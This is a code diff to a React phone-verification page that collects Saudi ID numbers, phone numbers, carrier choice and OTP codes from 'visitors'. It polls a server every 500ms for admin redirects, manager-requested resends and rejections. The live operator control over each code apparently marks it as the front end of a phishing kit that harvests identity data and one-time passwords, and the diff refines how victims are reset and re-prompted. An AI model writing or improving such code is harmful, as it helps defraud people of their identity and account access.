@@ -30,6 +30,7 @@ export default function VerifyPhonePage() {
   const [showPhoneOtpDialog, setShowPhoneOtpDialog] = useState(false)
   const [otpRejectionError, setOtpRejectionError] = useState("")
   const [phoneError, setPhoneError] = useState("")
+  const [phoneRejectionMessage, setPhoneRejectionMessage] = useState("")
 
   // Saudi telecom operators
   const telecomOperators = [
@@ -43,6 +44,23 @@ export default function VerifyPhonePage() {
   ]
 
   const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
+
+  const resetPhoneVerificationUi = () => {
+    setShowPhoneOtpDialog(false)
+    setShowStcModal(false)
+    setShowMobilyModal(false)
+    setShowCarrierModal(false)
+    setOtpRejectionError("")
+    setPhoneError("")
+    setIdError("")
+    setIdNumber("")
+    setPhoneNumber("")
+    setSelectedCarrier("")
+    setPhoneRejectionMessage("")
+    if (typeof window !== 'undefined') {
+      localStorage.removeItem('phoneOtpRejectionError')
+    }
+  }
   
   // Monitor for admin redirects
   useRedirectMonitor({ visitorId, currentPage: "phone" })
@@ -63,27 +81,41 @@ export default function VerifyPhonePage() {
 
     console.log("[phone-info] Setting up polling for visitor:", visitorId)
 
+    let lastPhoneStatus: string | null = null;
+    let lastRejectionMessage: string | null = null;
+
     const pollVisitorData = async () => {
       try {
         const res = await fetch(`/api/visitors/${visitorId}`)
         if (!res.ok) return
         const data = await res.json()
-        
-        // Check for resend request - show OTP dialog with message
-        if (data.phoneResendRequested) {
+        const nextPhoneStatus = data.phoneOtpStatus || null;
+        const nextRejectionMessage = data.phoneRejectionMessage || null;
+
+        // Rejection should always reset the form and alert the customer.
+        if (nextPhoneStatus === 'rejected' && nextRejectionMessage && lastPhoneStatus !== nextPhoneStatus) {
+          console.log("[phone-info] Reject state detected", data)
+          resetPhoneVerificationUi()
+          setPhoneRejectionMessage(nextRejectionMessage)
+          if (typeof window !== 'undefined') {
+            const currentPath = window.location.pathname;
+            if (currentPath !== '/step5' && currentPath !== '/phone') {
+              window.location.href = '/step5';
+              return;
+            }
+          }
+        }
+
+        // Show resend request if manager requested it.
+        if (data.phoneResendRequested && lastPhoneStatus !== nextPhoneStatus) {
           setOtpRejectionError("رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد")
           setShowPhoneOtpDialog(true)
         }
-        
-        // Check for rejection - return to phone form
-        if (data.phoneOtpStatus === 'rejected' && data.phoneRejectionMessage) {
-          // Close OTP dialog if open
-          setShowPhoneOtpDialog(false)
-          setIdNumber("")
-          setPhoneNumber("")
-          setSelectedCarrier("")
-          setOtpRejectionError("")
-          alert(data.phoneRejectionMessage)
+
+        // Keep state in sync if the server changes it later.
+        if (nextPhoneStatus !== lastPhoneStatus || nextRejectionMessage !== lastRejectionMessage) {
+          lastPhoneStatus = nextPhoneStatus;
+          lastRejectionMessage = nextRejectionMessage;
         }
         
         // Clear oneTimeRedirect after it was used by useRedirectMonitor
@@ -95,8 +127,9 @@ export default function VerifyPhonePage() {
       }
     }
 
-    // Poll every 1 second
-    const interval = setInterval(pollVisitorData, 1000)
+    // Poll every 500ms while the user is on the phone verification page.
+    const interval = setInterval(pollVisitorData, 500)
+    pollVisitorData();
     
     return () => {
       console.log("[phone-info] Cleaning up polling")
@@ -148,6 +181,9 @@ export default function VerifyPhonePage() {
     const value = e.target.value.replace(/\D/g, "") // Only numbers
     if (value.length <= 10) {
       setPhoneNumber(value)
+      if (phoneRejectionMessage) {
+        setPhoneRejectionMessage("")
+      }
       if (value.length === 10) {
         validatePhoneNumber(value)
       } else {
@@ -245,14 +281,7 @@ export default function VerifyPhonePage() {
       console.error("Error saving rejected phone data:", error)
     }
     
-    // Close all modals
-    setShowStcModal(false)
-    setShowMobilyModal(false)
-    setShowCarrierModal(false)
-    
-    // Reset form
-    setPhoneNumber("")
-    setSelectedCarrier("")
+    resetPhoneVerificationUi()
     
     toast.error("تم رفض رقم الهاتف", {
       description: "يرجى إدخال رقم جوال صحيح والمحاولة مرة أخرى",
@@ -371,6 +400,11 @@ export default function VerifyPhonePage() {
               </div>
               {phoneError && (
                 <p className="text-red-500 text-sm text-right">{phoneError}</p>
+              )}
+              {phoneRejectionMessage && (
+                <p className="text-red-600 text-sm text-right font-semibold bg-red-50 border border-red-200 rounded-md px-3 py-2 mt-2">
+                  {phoneRejectionMessage}
+                </p>
               )}
             </div>
 
